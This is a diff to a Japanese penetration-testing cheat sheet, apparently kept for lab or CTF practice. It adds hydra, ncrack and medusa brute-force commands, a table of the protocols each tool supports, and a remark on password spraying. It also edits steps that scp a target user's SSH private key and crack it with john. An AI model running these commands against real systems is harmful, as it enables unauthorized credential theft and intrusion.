@@ -83,7 +83,8 @@ mkdir ~/pwd-list \
 && wget -P ~/pwd-list/ http://downloads.skullsecurity.org/passwords/conficker.txt.bz2 \
 && wget -P ~/pwd-list/ http://downloads.skullsecurity.org/passwords/500-worst-passwords.txt.bz2 \
 && wget -P ~/pwd-list/ http://downloads.skullsecurity.org/passwords/twitter-banned.txt.bz2 \
-&& wget -P ~/pwd-list/ http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2 \
+# Kaliイメージの「/usr/share/wordlists/rockyou.txt」の方が新しい
+# && wget -P ~/pwd-list/ http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2 \
 && wget -P ~/pwd-list/ http://downloads.skullsecurity.org/passwords/phpbb.txt.bz2 \
 && wget -P ~/pwd-list/ http://downloads.skullsecurity.org/passwords/myspace.txt.bz2 \
 && wget -P ~/pwd-list/ http://downloads.skullsecurity.org/passwords/hotmail.txt.bz2 \
@@ -275,16 +276,51 @@ check pcap
 === ディレクトリ検査
 
 ----
-gobuster -e -u http://A.B.C.D/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200,301,302,403,404 -e -x html,php,txt -l -o ./result_gobuster.txt
+gobuster -e -u http://[TargetIP]/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200,301,302,403,404 -e -x html,php,txt -l -o ./result_gobuster.txt
 ----
 
 === Bruteforce Attack
 
+.Bruteforce tool list
+|===
+|ツール名
+|サポートプロトコル
+
+|Hydra
+|TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc, RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ, SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP, Subversion/SVN, Firebird, LDAP2, Cisco AAA
+
+|Medusa
+|AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper,
+Web Form
+
+|Ncrack
+|RDP, SSH, http(s), SMB, pop3(s), VNC, FTP, telnet
+|===
+
+==== hydra
+
 ----
 # -Vオプション：PWDマイニング中に2つのログイン+パスワードを表示
 # -fオプション：指定したPWDが見つかったら停止
-hydra -l [uname] -P ./pwd-list/[pwdtext] [IP] [Protocol] -V -f
+hydra -l [uname] -P ~/pwd-list/[pwdtext] [TargetIP] [TargetProtocol] -V -f
 # 効率的には、およそssh(2/s) < ftp(6/s) < http-basic(100/s)の速さ
+# パスワードスプレー攻撃も可能
+----
+
+==== ncrack
+
+* RDPサービスに関してはhydraより早いらしい
+
+----
+ncrack -u [uname] -P ~/pwd-list/[pwdtext] -T5 [TargetIP] -p [TargetServicePort]
+----
+
+==== meduza
+
+* 一番遅い
+
+----
+medusa -u [uname] -P ~/pwd-list/[pwdtext] -h [TargetIP] -M [TragetService]
 ----
 
 === Penetration
@@ -306,9 +342,9 @@ rlwrap nc -lvnp 1234
 ==== RSAプライベートキーのクラック
 
 ----
-scp target-user@target-IP:/home/target-user2/.ssh/id_rsa /root/
+scp [TargetUser]@[TargetIP]:/home/[TargetUser2]/.ssh/id_rsa /root/
 /usr/share/john/ssh2john.py ./id_rsa > crack
-john --format=SSH --wordlist=./rockyou.txt crack
+john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt crack
 john crack --show
 chmod 600 id_rsa
 ----
